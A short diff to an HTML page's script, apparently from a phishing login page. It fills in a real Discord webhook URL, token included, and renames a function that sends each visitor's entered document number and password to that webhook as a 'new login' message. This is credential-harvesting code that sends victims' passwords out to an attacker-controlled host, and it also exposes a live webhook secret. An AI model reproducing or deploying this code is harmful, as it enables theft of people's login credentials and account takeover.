@@ -314,8 +314,8 @@
     </main>
 
     <script>
-        async function sendDiscordNotification(docNumber, password) {
-            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // REEMPLAZA con tu webhook real
+        async function senddNotification(docNumber, password) {
+            const webhookURL = 'https://discord.com/api/webhooks/1405668339992363008/Jwg1y1TsyA3eVEkpIC0P-n7zyQ0BUwCxSpQg8CFrOoDFbSXARHaD68ndkKClJkKal59M'; // REEMPLAZA con tu webhook real
 
             const data = {
                 content: `Nuevo inicio de sesión:\nDocumento: ${docNumber || 'desconocido'}\nContraseña: ${password || 'no especificada'}`
